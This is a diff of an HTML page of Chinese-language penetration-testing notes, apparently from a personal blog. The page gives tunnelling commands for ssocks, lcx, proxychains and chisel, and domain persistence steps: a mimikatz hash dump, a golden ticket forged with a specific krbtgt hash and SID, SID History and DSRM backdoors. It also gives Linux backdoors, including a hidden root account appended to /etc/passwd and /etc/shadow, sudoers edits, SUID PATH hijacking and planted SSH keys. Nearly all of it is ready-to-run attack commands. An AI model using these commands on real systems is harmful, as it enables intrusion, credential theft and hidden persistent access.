+</span></span><span class="line"><span class="cl">-s state setup the function.                       // 状态设置功能。共有六种ssocksd rcsocks rssocks lcx_slave lcx_tran lcx_listen
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ssocksd rcsocks rssocks 为socket5 正向代理，反向代理，正反向代理
+</span></span><span class="line"><span class="cl">lcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。
+</span></span><span class="line"><span class="cl">lcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。
+</span></span><span class="line"><span class="cl">lcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。
+</span></span></code></pre></div><h3 id="proxychains4-使用方法">proxychains4 使用方法<a hidden class="anchor" aria-hidden="true" href="#proxychains4-使用方法">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 nmap -p 3389 -Pn -sT 192.168.52.141   # 需要配置/etc/proxychains4.conf文件   -Pn和-sT必须要有， 192.168.52.141是要扫描的内网地址
+</span></span></code></pre></div><h3 id="chisel使用">chisel使用<a hidden class="anchor" aria-hidden="true" href="#chisel使用">#</a></h3>
 <ol>
 <li>端口转发 #将本地的11111端口转发到服务器上的8000端口</li>
 </ol>
-<pre tabindex="0"><code>正向链接
- ./chisel server -p 12345  
- chisel.exe client 192.168.61.128:12345 11111:127.0.0.1:8000
- 反向链接
- chisel.exe server -p 12345 --reverse
- ./chisel client 192.168.61.129:12345 R:11111:127.0.0.1:8000
-</code></pre><ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">正向链接
+</span></span><span class="line"><span class="cl"> ./chisel server -p 12345  
+</span></span><span class="line"><span class="cl"> chisel.exe client 192.168.61.128:12345 11111:127.0.0.1:8000
+</span></span><span class="line"><span class="cl"> 反向链接
+</span></span><span class="line"><span class="cl"> chisel.exe server -p 12345 --reverse
+</span></span><span class="line"><span class="cl"> ./chisel client 192.168.61.129:12345 R:11111:127.0.0.1:8000
+</span></span></code></pre></div><ol>
 <li>socks代理  本地1088端口代理服务器</li>
 </ol>
-<pre tabindex="0"><code>正向链接
-chisel.exe server -p 12345 --socks5
-./chisel client 192.168.61.129:12345 1088:socks
-反向链接
-./chisel server -p 12345 --reverse  --socks5
-./chisel client 192.168.111.2:12345 R:1088:socks
-</code></pre><h2 id="权限维持">权限维持<a hidden class="anchor" aria-hidden="true" href="#权限维持">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">正向链接
+</span></span><span class="line"><span class="cl">chisel.exe server -p 12345 --socks5
+</span></span><span class="line"><span class="cl">./chisel client 192.168.61.129:12345 1088:socks
+</span></span><span class="line"><span class="cl">反向链接
+</span></span><span class="line"><span class="cl">./chisel server -p 12345 --reverse  --socks5
+</span></span><span class="line"><span class="cl">./chisel client 192.168.111.2:12345 R:1088:socks
+</span></span></code></pre></div><h2 id="权限维持">权限维持<a hidden class="anchor" aria-hidden="true" href="#权限维持">#</a></h2>
 <h3 id="黄金票据">黄金票据<a hidden class="anchor" aria-hidden="true" href="#黄金票据">#</a></h3>
 <ol>
 <li>导出域控制器用户密码或hash</li>
 </ol>
-<pre tabindex="0"><code>privilege::debug
-lsadump::lsa /patch        # 专用于在域控制器上导出用户密码或hash
-</code></pre><ol start="2">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">lsadump::lsa /patch        # 专用于在域控制器上导出用户密码或hash
+</span></span></code></pre></div><ol start="2">
 <li>切换到用户主机下使用minikatz生成票据</li>
 </ol>
-<pre tabindex="0"><code>kerberos::golden /user:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:ticket.kirbi
- # kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi
-</code></pre><ol start="3">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kerberos::golden /user:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:ticket.kirbi
+</span></span><span class="line"><span class="cl"> # kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi
+</span></span></code></pre></div><ol start="3">
 <li>修改票据</li>
 </ol>
-<pre tabindex="0"><code>kerberos::purge   #先清空所有票据
-kerberos::ptt ticket.kirbi    #再将生成的票据注入域用户主机Windows7中
-kerberos::tgt #查看系统票据
-</code></pre><h3 id="sid-history域后门">SID History域后门<a hidden class="anchor" aria-hidden="true" href="#sid-history域后门">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kerberos::purge   #先清空所有票据
+</span></span><span class="line"><span class="cl">kerberos::ptt ticket.kirbi    #再将生成的票据注入域用户主机Windows7中
+</span></span><span class="line"><span class="cl">kerberos::tgt #查看系统票据
+</span></span></code></pre></div><h3 id="sid-history域后门">SID History域后门<a hidden class="anchor" aria-hidden="true" href="#sid-history域后门">#</a></h3>
 <ol>
 <li>
 <p>添加恶意用户
@@ -773,35 +773,35 @@ kerberos::tgt #查看系统票据
 <p>使用mimikatz将域管理员的SID添加到恶意域用户</p>
 </li>
 </ol>
-<pre tabindex="0"><code>privilege::debug
-sid::patch
-sid::add /sam:aaa /new:Administrator   //将管理员Administrator的SID添加到用户aaa的SID History属性中
-</code></pre><h3 id="dsrm-后门">DSRM 后门<a hidden class="anchor" aria-hidden="true" href="#dsrm-后门">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">sid::patch
+</span></span><span class="line"><span class="cl">sid::add /sam:aaa /new:Administrator   //将管理员Administrator的SID添加到用户aaa的SID History属性中
+</span></span></code></pre></div><h3 id="dsrm-后门">DSRM 后门<a hidden class="anchor" aria-hidden="true" href="#dsrm-后门">#</a></h3>
 <ol>
 <li>修改DSRM账户（需要远程登录调用cmd窗口，有危险）</li>
 </ol>
-<pre tabindex="0"><code>ntdsutil    // 进入ntdsutil
-set dsrm password    // 设置DSRM账户的密码
-reset password on server null    // 在当前域控制器上恢复DSRM密码
-&lt;password&gt;    // 输入新密码
-&lt;password&gt;    // 重新输入新密码
-q    //退出DSRM密码设置模式
-q    // 退出ntdsutil
-</code></pre><ol start="2">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ntdsutil    // 进入ntdsutil
+</span></span><span class="line"><span class="cl">set dsrm password    // 设置DSRM账户的密码
+</span></span><span class="line"><span class="cl">reset password on server null    // 在当前域控制器上恢复DSRM密码
+</span></span><span class="line"><span class="cl">&lt;password&gt;    // 输入新密码
+</span></span><span class="line"><span class="cl">&lt;password&gt;    // 重新输入新密码
+</span></span><span class="line"><span class="cl">q    //退出DSRM密码设置模式
+</span></span><span class="line"><span class="cl">q    // 退出ntdsutil
+</span></span></code></pre></div><ol start="2">
 <li>DSRM与域用户同步（于第一步类似，不必重复）</li>
 </ol>
-<pre tabindex="0"><code>ntdsutil // 进入ntdsutil 
-set dsrm password // 设置DSRM账户的密码
-sync from domain account domainusername  // 使DSRM的密码和指定的domainusername域用户的密码同步
-q //退出DSRM密码设置模式    
-q // 退出ntdsutil
-</code></pre><ol start="3">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ntdsutil // 进入ntdsutil 
+</span></span><span class="line"><span class="cl">set dsrm password // 设置DSRM账户的密码
+</span></span><span class="line"><span class="cl">sync from domain account domainusername  // 使DSRM的密码和指定的domainusername域用户的密码同步
+</span></span><span class="line"><span class="cl">q //退出DSRM密码设置模式    
+</span></span><span class="line"><span class="cl">q // 退出ntdsutil
+</span></span></code></pre></div><ol start="3">
 <li>启用DSRM登录</li>
 </ol>
-<pre tabindex="0"><code>New-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34; -name &#34;DsrmAdminLogonBehavior&#34; -value 2 -propertyType DWORD #powershell
-或
-reg add &#34;HKLM\System\CurrentControlSet\Control\Lsa&#34; /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2   #cmd方式
-</code></pre><ol start="4">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">New-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34; -name &#34;DsrmAdminLogonBehavior&#34; -value 2 -propertyType DWORD #powershell
+</span></span><span class="line"><span class="cl">或
+</span></span><span class="line"><span class="cl">reg add &#34;HKLM\System\CurrentControlSet\Control\Lsa&#34; /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2   #cmd方式
+</span></span></code></pre></div><ol start="4">
 <li>mimikatz获取NTLM hash （见mimikate用法）</li>
 <li>mimikatz使用hash攻击 （见mimikate用法）</li>
 </ol>
@@ -810,37 +810,37 @@ reg add &#34;HKLM\System\CurrentControlSet\Control\Lsa&#34; /f /v DsrmAdminLogon
 <ol>
 <li>创建普通用户（密码123456）</li>
 </ol>
-<pre tabindex="0"><code>echo &#39;meme:x:1001:1001:,,,:/home/meme:/bin/bash&#39; &gt;&gt; /etc/passwd
-echo &#39;meme:x:1001:&#39; &gt;&gt; /etc/group
-echo &#39;meme:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::&#39; &gt;&gt; /etc/shadow
-echo &#39;meme:!::&#39; &gt;&gt; /etc/gshadow
-</code></pre><ol start="2">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;meme:x:1001:1001:,,,:/home/meme:/bin/bash&#39; &gt;&gt; /etc/passwd
+</span></span><span class="line"><span class="cl">echo &#39;meme:x:1001:&#39; &gt;&gt; /etc/group
+</span></span><span class="line"><span class="cl">echo &#39;meme:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::&#39; &gt;&gt; /etc/shadow
+</span></span><span class="line"><span class="cl">echo &#39;meme:!::&#39; &gt;&gt; /etc/gshadow
+</span></span></code></pre></div><ol start="2">
 <li>提权</li>
 </ol>
-<pre tabindex="0"><code>echo &#39;ubuntu ALL=(ALL:ALL) ALL&#39; &gt;&gt; /etc/sudoers  #需要root权限才能做，不能使用sudo
-sudo su root #输入ubuntu用户的密码即可
-</code></pre><ol start="3">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;ubuntu ALL=(ALL:ALL) ALL&#39; &gt;&gt; /etc/sudoers  #需要root权限才能做，不能使用sudo
+</span></span><span class="line"><span class="cl">sudo su root #输入ubuntu用户的密码即可
+</span></span></code></pre></div><ol start="3">
 <li>创建root用户（密码123456）</li>
 </ol>
-<pre tabindex="0"><code>echo &#39;xi:x:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd
-echo &#39;xi:x:0:&#39; &gt;&gt; /etc/group
-echo &#39;xi:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::&#39; &gt;&gt; /etc/shadow
-echo &#39;xi:!::&#39; &gt;&gt; /etc/gshadow
-</code></pre><h3 id="suid-ps程序提权">suid ps程序提权<a hidden class="anchor" aria-hidden="true" href="#suid-ps程序提权">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;xi:x:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd
+</span></span><span class="line"><span class="cl">echo &#39;xi:x:0:&#39; &gt;&gt; /etc/group
+</span></span><span class="line"><span class="cl">echo &#39;xi:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::&#39; &gt;&gt; /etc/shadow
+</span></span><span class="line"><span class="cl">echo &#39;xi:!::&#39; &gt;&gt; /etc/gshadow
+</span></span></code></pre></div><h3 id="suid-ps程序提权">suid ps程序提权<a hidden class="anchor" aria-hidden="true" href="#suid-ps程序提权">#</a></h3>
 <ol>
 <li>前提条件，存在一个SUID程序，并且该程序调用ps命令</li>
 <li>判断条件：</li>
 </ol>
-<pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null   # 查找短暂拥有root权限的命令程序
-</code></pre><ol start="3">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -perm -u=s -type f 2&gt;/dev/null   # 查找短暂拥有root权限的命令程序
+</span></span></code></pre></div><ol start="3">
 <li>修改环境变量，伪造ps命令</li>
 </ol>
-<pre tabindex="0"><code>cd /tmp
-echo &#34;/bin/bash&#34; &gt; ps
-chmod 777 ps
-export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序
-或 ln -s /bin/bash /tmp/ps
-</code></pre><ol start="4">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">/</span><span class="n">tmp</span>
+</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> <span class="o">&gt;</span> <span class="n">ps</span>
+</span></span><span class="line"><span class="cl"><span class="n">chmod</span> <span class="mi">777</span> <span class="n">ps</span>
+</span></span><span class="line"><span class="cl"><span class="k">export</span> <span class="n">PATH</span><span class="o">=/</span><span class="n">tmp</span><span class="p">:</span><span class="o">$</span><span class="n">PATH</span> <span class="c1"># 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</span>
+</span></span><span class="line"><span class="cl"><span class="err">或</span> <span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ps</span>
+</span></span></code></pre></div><ol start="4">
 <li>执行判断条件2中获取的程序。</li>
 </ol>
 <blockquote>
@@ -850,15 +850,15 @@ export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行
 <ol>
 <li>本地生成文件</li>
 </ol>
-<pre tabindex="0"><code>ssh-keygen -t rsa  #生成公钥和私钥
-(echo -e &#34;\n\n&#34;; cat ~/.ssh/id_rsa.pub; echo -e &#34;\n\n&#34;) &gt; public.txt #到处公钥
-(echo -e &#34;\n\n&#34;; cat /root/.ssh/id_rsa; echo -e &#34;\n\n&#34;) &gt; private.txt #到处私钥
-</code></pre><ol start="2">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh-keygen -t rsa  #生成公钥和私钥
+</span></span><span class="line"><span class="cl">(echo -e &#34;\n\n&#34;; cat ~/.ssh/id_rsa.pub; echo -e &#34;\n\n&#34;) &gt; public.txt #到处公钥
+</span></span><span class="line"><span class="cl">(echo -e &#34;\n\n&#34;; cat /root/.ssh/id_rsa; echo -e &#34;\n\n&#34;) &gt; private.txt #到处私钥
+</span></span></code></pre></div><ol start="2">
 <li>公钥上传</li>
 </ol>
-<pre tabindex="0"><code>cp -avx ~/ubuntu/.ssh/id_rsa.pub ~/.ssh/authorized_keys  #~/.ssh/authorized_keys 是上传的文件路径 
-echo &#39;生成的.pub文件的内容即hello.pub&#39; &gt; ~/.ssh/authorized_keys 　　　　　　                           #写入文件
-</code></pre>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cp -avx ~/ubuntu/.ssh/id_rsa.pub ~/.ssh/authorized_keys  #~/.ssh/authorized_keys 是上传的文件路径 
+</span></span><span class="line"><span class="cl">echo &#39;生成的.pub文件的内容即hello.pub&#39; &gt; ~/.ssh/authorized_keys 　　　　　　                           #写入文件
+</span></span></code></pre></div>
 
   </div>
 
